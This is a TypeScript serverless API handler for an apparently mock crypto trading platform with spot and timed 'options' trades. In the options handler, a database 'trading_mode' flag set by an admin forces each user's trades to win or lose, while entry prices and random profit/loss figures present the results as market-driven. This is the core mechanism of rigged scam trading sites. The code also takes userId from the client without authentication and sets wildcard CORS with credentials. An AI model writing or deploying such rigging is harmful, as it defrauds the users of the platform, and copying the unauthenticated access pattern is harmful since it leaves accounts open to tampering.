import type { VercelRequest, VercelResponse } from '@vercel/node';
import { supabaseAdmin } from '../lib/supabase';

// Mock user balances
const userBalances = new Map([
  ['user-1', { balance: 10000, currency: 'USDT' }],
  ['demo-user-1', { balance: 10000, currency: 'USDT' }],
  ['superadmin-001', { balance: 1000000, currency: 'USDT' }]
]);

// Mock trades storage
const trades = new Map();

export default async function handler(req: VercelRequest, res: VercelResponse) {
  try {
    console.log(`📈 Trading API: ${req.method} ${req.url}`);
    
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');

    if (req.method === 'OPTIONS') {
      return res.status(200).end();
    }

    const url = req.url || '';
    
    // Handle different trading endpoints
    if (url.includes('/spot')) {
      return handleSpotTrading(req, res);
    } else if (url.includes('/options')) {
      return handleOptionsTrading(req, res);
    } else if (req.method === 'GET') {
      // Get user trades
      return handleGetTrades(req, res);
    }

    return res.status(404).json({
      success: false,
      message: "Trading endpoint not found"
    });

  } catch (error) {
    console.error('❌ Trading API error:', error);
    return res.status(500).json({
      success: false,
      message: "Trading error",
      error: error instanceof Error ? error.message : 'Unknown error'
    });
  }
}

function handleSpotTrading(req: VercelRequest, res: VercelResponse) {
  if (req.method === 'POST') {
    const { symbol, side, amount, price, userId } = req.body || {};
    
    console.log('📈 Spot trade request:', { symbol, side, amount, price, userId });
    
    if (!symbol || !side || !amount) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields: symbol, side, amount"
      });
    }

    // Check user balance
    const userBalance = userBalances.get(userId || 'demo-user-1') || { balance: 0, currency: 'USDT' };
    const tradeAmount = parseFloat(amount);
    
    if (userBalance.balance < tradeAmount) {
      return res.status(400).json({
        success: false,
        message: "Insufficient balance"
      });
    }

    // Create trade
    const trade = {
      id: `trade-${Date.now()}`,
      userId: userId || 'demo-user-1',
      symbol,
      side,
      amount: tradeAmount,
      price: parseFloat(price) || 0,
      type: 'spot',
      status: 'completed',
      profit_loss: (Math.random() > 0.5 ? '+' : '-') + (Math.random() * 100).toFixed(2),
      created_at: new Date().toISOString()
    };

    trades.set(trade.id, trade);

    // Update balance (simplified)
    if (side === 'buy') {
      userBalance.balance -= tradeAmount;
    } else {
      userBalance.balance += tradeAmount;
    }
    userBalances.set(userId || 'demo-user-1', userBalance);

    console.log('✅ Spot trade executed:', trade);
    return res.json({
      success: true,
      trade,
      message: "Spot trade executed successfully"
    });
  }

  return res.status(405).json({ message: "Method not allowed" });
}

function handleOptionsTrading(req: VercelRequest, res: VercelResponse) {
  if (req.method === 'POST') {
    const { symbol, side, direction, amount, duration, userId } = req.body || {};

    // Accept either 'side' or 'direction' for compatibility
    const tradeDirection = side || direction;

    console.log('📈 Options trade request:', { symbol, side, direction, tradeDirection, amount, duration, userId });

    if (!symbol || !tradeDirection || !amount || !duration) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields: symbol, direction/side, amount, duration"
      });
    }

    // Check user balance
    const userBalance = userBalances.get(userId || 'demo-user-1') || { balance: 0, currency: 'USDT' };
    const tradeAmount = parseFloat(amount);
    
    if (userBalance.balance < tradeAmount) {
      return res.status(400).json({
        success: false,
        message: "Insufficient balance"
      });
    }

    // Create options trade
    const trade = {
      id: `options-${Date.now()}`,
      userId: userId || 'demo-user-1',
      symbol,
      direction: tradeDirection, // 'up' or 'down'
      side: tradeDirection === 'up' ? 'call' : 'put', // Convert to call/put for compatibility
      amount: tradeAmount,
      duration: parseInt(duration), // in seconds
      type: 'options',
      status: 'active',
      entry_price: 117000 + (Math.random() * 2000), // Mock current price
      target_price: null,
      profit_loss: '0.00',
      created_at: new Date().toISOString(),
      expires_at: new Date(Date.now() + parseInt(duration) * 1000).toISOString()
    };

    trades.set(trade.id, trade);

    // Deduct amount from balance
    userBalance.balance -= tradeAmount;
    userBalances.set(userId || 'demo-user-1', userBalance);

    // Simulate trade completion after duration
    setTimeout(async () => {
      // Get user's trading mode from database to determine outcome
      let tradingMode = 'normal';
      try {
        if (supabaseAdmin) {
          const { data: user } = await supabaseAdmin
            .from('users')
            .select('trading_mode')
            .eq('id', userId)
            .single();

          if (user) {
            tradingMode = user.trading_mode || 'normal';
          }
        }
      } catch (error) {
        console.log('⚠️ Could not fetch user trading mode, using normal');
      }

      // Determine win/loss based on admin settings
      let isWin: boolean;
      if (tradingMode === 'win') {
        isWin = true; // Force win
      } else if (tradingMode === 'lose') {
        isWin = false; // Force lose
      } else {
        isWin = Math.random() > 0.5; // Normal 50% win rate
      }

      const profit = isWin ? tradeAmount * 0.8 : 0; // 80% profit on win

      trade.status = 'completed';
      trade.target_price = null; // Set to null as expected by the type
      trade.profit_loss = isWin ? `+${profit.toFixed(2)}` : `-${tradeAmount.toFixed(2)}`;

      if (isWin) {
        const currentBalance = userBalances.get(userId || 'demo-user-1') || { balance: 0, currency: 'USDT' };
        currentBalance.balance += tradeAmount + profit;
        userBalances.set(userId || 'demo-user-1', currentBalance);
      }

      trades.set(trade.id, trade);
      console.log('✅ Options trade completed:', {
        tradeId: trade.id,
        isWin,
        tradingMode,
        profit: trade.profit_loss
      });
    }, Math.min(parseInt(duration) * 1000, 30000)); // Max 30 seconds for demo

    console.log('✅ Options trade created:', trade);
    return res.json({
      success: true,
      trade,
      message: "Options trade created successfully"
    });
  }

  return res.status(405).json({ message: "Method not allowed" });
}

function handleGetTrades(req: VercelRequest, res: VercelResponse) {
  const userId = req.query.userId as string || 'demo-user-1';
  const userTrades = Array.from(trades.values()).filter(trade => trade.userId === userId);
  
  console.log('📈 Getting trades for user:', userId, 'Count:', userTrades.length);
  return res.json(userTrades);
}
